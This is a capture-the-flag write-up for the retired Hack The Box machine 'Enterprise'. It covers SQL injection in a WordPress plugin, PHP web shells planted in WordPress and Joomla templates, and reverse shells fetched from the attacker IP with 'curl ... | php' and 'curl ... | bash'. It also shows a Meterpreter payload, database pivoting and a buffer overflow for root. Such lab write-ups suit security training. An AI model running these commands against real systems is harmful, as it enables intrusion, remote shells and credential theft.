# Enterprise

This is the write-up for the box Enterprise that got retired at the 17th March 2018.
My IP address was 10.10.14.17 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.61    enterprise.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/enterprise.nmap 10.10.10.61
```

```markdown
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Noteworthy:
- Port 443 is Apache version 2.4.25 (Ubuntu)
- Port 80 and 8080 is Apache version 2.4.10 (Debian)

## Checking HTTP (Port 80)

The website on port 80 shows some content but it does not render correctly.
When browsing to the hostname _enterprise.htb_ it renders correctly and shows a blog that is hosted on **WordPress**.

![WordPress page](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-1.png)

All articles are written by the user _william.riker_.

Lets run **wpscan** to enumerate it:
```markdown
wpscan --url http://10.10.10.61 --enumerate p,t,u,tt
```

It did not find anything interesting.

## Checking HTTP (Port 8080)

The website on port 8080 is hosted on **Joomla** with the title _"Ten Forward"_.
This web page has a login form but we do not have any credentials yet:

![Login page on Joomla](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-2.png)

## Checking HTTPS (Port 443)

The website on port 443 shows the default Apache2 Ubuntu page.
In the certificate is an email address, that could be a potential username _jeanlucpicard@enterprise.local_.

Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u https://10.10.10.61 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

It finds the directory _/files_ which is an index with one file called _lcars.zip_.
In this ZIP file are three PHP files:
- _lcars_db.php_

```php
(...)
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}
```

- _lcars_dbpost.php_

```php
(...)
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}
```

- _lcars.php_

```markdown
<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */

// Need to create the user interface.

// need to finsih the db interface

// need to make it secure

?>
```

The author of _lcars.php_ is _geordi la forge_ which could be another potential username and seems to code a WordPress plugin called _lcars_.
Plugins can be found in the directory _/wp-content/plugins/lcars/_ on port 80 and when trying to access _/lcars_db.php/_ it shows the message _"Failed to read query"_ which confirms that the plugin exists.

## Exploiting the WordPress plugin (Port 80)

In _lcars_db.php_ it can be seen, that it takes the parameter _query_ and using an ID of a WordPress blog article as the value:
```markdown
http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1
```

It shows an error because it cannot return a string and we need to force it to return an error message that will be a string.
```markdown
Catchable fatal error: Object of class mysqli_result could not be converted to string in /var/www/html/wp-content/plugins/lcars/lcars_db.php on line 16
```

As this is a **SQL Injection vulnerability** we can send the request to **SQLmap**:
```markdown
sqlmap -r lcars_db.req --dbms mysql
```

```markdown
sqlmap -r lcars_db.req --dbms mysql --dump
```

There are some passwords stored in one of the databases that keeps drafts for articles:
```markdown
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```

The login page for WordPress is on _/wp-login.php_ and after trying all of those passwords with the username _william.riker_, access is granted with the fourth one _"u*Z14ru0p#ttj83zS6"_.

### Getting Code Execution on WordPress

To get code execution, PHP files can be modified to run system commands:
```markdown
Appearance --> Editor --> Theme Header (header.php)
```

Add PHP code to beginning of file:
```markdown
echo system($_REQUEST['cmd']);
```

Running `whoami` command:
```markdown
http://enterprise.htb/?cmd=whoami
```

In the source code it shows the result as _www-data_ and code execution works. Lets start a reverse shell connection by using a PHP reverse shell from the **Laudanum scripts**:
```markdown
http://enterprise.htb/?cmd=curl%2010.10.14.17/php-reverse-shell-p9001.php%20|%20php
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

When checking the IP address with `ip a` it shows 172.17.0.4 and _user.txt_ says the following:
```markdown
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```

It seems like that this is not the target box yet.

## Pivoting to Joomla (Port 8080)

The ARP table can be checked with `ip neigh` and it has two IP addresses 172.17.0.1 & 172.17.0.2.

In the WordPress configuration file _/var/www/html/wp-config.php_ is a password that could be used to pivot to the database server that also has the database of **Joomla**:
```markdown
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');
```

As there is no MySQL installed on this current server, **Metasploit** can be used to pivot through that client to another one.

Creating binary to start **Meterpreter** connection:
```markdown
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9002 -f elf -o msf.bin
```

Setting up listener in **Metasploit**:
```markdown
use exploit/multi/handler

set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.17
set LPORT 9002

exploit -j
```

Downloading binary on box, making it executable and executing it:
```markdown
curl 10.10.14.17/msf.bin -o msf.bin

chmod +x msf.bin

./msf.bin
```

After executing it, the listener starts a session and we are able to pivot to port 3306 on 172.17.0.2 with the `portfwd` command in **Meterpreter**:
```markdown
meterpreter> portfwd add -l 9003 -p 3306 -r 172.17.0.2
```

Connecting to MySQL server through port 9003 on localhost with _root_ and the password _"NCC-1701E"_:
```markdown
mysql -h 127.0.0.1 -P 9003 -u root -p
```

The `show databases;` command shows all databases on the server including the **Joomla** database that we want to enumerate:
```markdown
MySQL [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| joomladb           |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
| wordpressdb        |
+--------------------+
```

Getting users for **Joomla**:
```markdown
use joomladb;

show tables;

select id, name, username, password from edz2g_users;
```
```markdown
+-----+------------+-----------------+--------------------------------------------------------------+
| id  | name       | username        | password                                                     |
+-----+------------+-----------------+--------------------------------------------------------------+
| 400 | Super User | geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
| 401 | Guinan     | Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
+-----+------------+-----------------+--------------------------------------------------------------+
```

The login page for Joomla is on _/administrator_ and now that we have the usernames, all the passwords from before can be tried on both of these.
Access is granted with the username _geordi.la.forge_ and the password _"ZD3YxfnSjezg67JZ"_.

### Getting Code Execution on Joomla

To get code execution, PHP files can be modified to run system commands:
```markdown
Extensions --> Templates --> Templates --> Protostar Details and Files --> index.php
```

Add PHP code to beginning of file:
```markdown
echo system($_REQUEST['cmd']);
```

Running `whoami` command:
```markdown
http://10.10.10.61:8080/index.php?cmd=whoami
```

In the source code it shows the result as _www-data_ and code execution works. Lets start a reverse shell connection by using a PHP reverse shell from the **Laudanum scripts**:
```markdown
http://10.10.10.61:8080/index.php?cmd=curl%2010.10.14.17/php-reverse-shell-p9004.php%20|%20php
```

After sending the request, the listener on my IP and port 9004 starts a reverse shell as _www-data_.
When checking the IP address with `ip a` it shows 172.17.0.3.

## Pivoting to Enterprise (Port 443)

Now we got access to the **WordPress** box _(Port 80)_ and **Joomla** box _(Port 8080)_ and the next station will be the box on port 443 that hosted the _lcars.zip_.
This is the box that probably has SSH open as the initial Nmap scan shows.

When looking at the mounted shares on the Joomla box with `mount`, it shows that _/var/www/html/files_ is mounted and in there is _lcars.zip_.
The current user _www-data_ has access to write files in there and after checking the index on port 443 the files are also displayed, which means we have the ability to upload files to Enterprise.

Lets upload the PHP shell from the **Laudanum scripts** to the directory _/var/www/html/files_:
```markdown
curl 10.10.14.17/php-reverse-shell-p9005.php -o shell.php
```

Running it by clicking on it on the index page:

![Executing shell.php](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_web-3.png)

After executing it the listener on my IP and port 9005 starts a reverse shell as _www-data_.
When checking the IP address with `ip a` it shows different interfaces and also 10.10.10.61 which is the target box.

## Privilege Escalation

To get an attack surface, it is recommended to run any **Linux Enumeration script**:
```markdown
curl 10.10.14.17/LinEnum.sh | bash
```

After analyzing the output, there are some interesting observations:
- Server listens on port 5355 and 32812
- The binary _/bin/lcars_ has the SetUID-bit set

When executing _lcars_ it shows some kind of console where it wants to have an access code:
```markdown
                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code:
test123

Invalid Code
Terminating Console
```

It is also the service that runs on port 32812:
```markdown
nc 10.10.10.61 32812
```

Lets copy the binary to our local client to reverse engineer it and look for syscalls and libraries it uses:
```markdown
ltrace ./lcars.bin
```

After the input it shows that it uses a `strcmp` against the string _picarda1_ which seems to be the access code:
```markdown
fgets(test
"test\n", 9, 0xf7efa580)
strcmp("test\n", "picarda1")
```

With this access code, it shows the menu of the tool:
```markdown
       _______ _______  ______ _______
|      |       |_____| |_____/ |______
|_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu:

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
```

All of those menus want some kind of input, so trying which one can't handle long strings and crashes:
```markdown
python -c 'print "A"*500'
```

After sending 500 A characters to the menus, the menu _"4. Security"_ crashes with a **Segmentation Fault**:
```markdown
LCARS Bridge Secondary Controls -- Main Menu:
(...)
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
4
Disable Security Force Fields
Enter Security Override:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Looking at what happens with **gdb** and sending a specific pattern to it:
```markdown
gdb ./lcars.bin
```
```markdown
gdb-peda$ pattern_create 500

gdb-peda$ run
```

After running it with that pattern, it found the offset at 212 characters in:

![Offset on 212](https://kyuu-ji.github.io/htb-write-up/enterprise/enterprise_re-1.png)

Also **ASLR** is disabled on the box which doesn't have to be bypassed:
```markdown
www-data@enterprise:/$ cat /proc/sys/kernel/randomize_va_space
0
www-data@enterprise:/$ ldd /bin/lcars | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
www-data@enterprise:/$ ldd /bin/lcars | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
```

To write an exploit script, there is some information needed.

Getting system address on the box:
```markdown
(gdb) p system

0xf7e4c060
```

Getting exit address on the box:
```markdown
(gdb) p exit

0xf7e3faf0
```

Getting shell address on the box:
```markdown
(gdb) find &system,+9999999,"sh"

0xf7f6ddd5
```

The script to exploit the service is called _enterprise_re.py_ and can be found in this repository.
```markdown
python enterprise_re.py
```

After running the script the Buffer Overflow is exploited and starts a root shell!
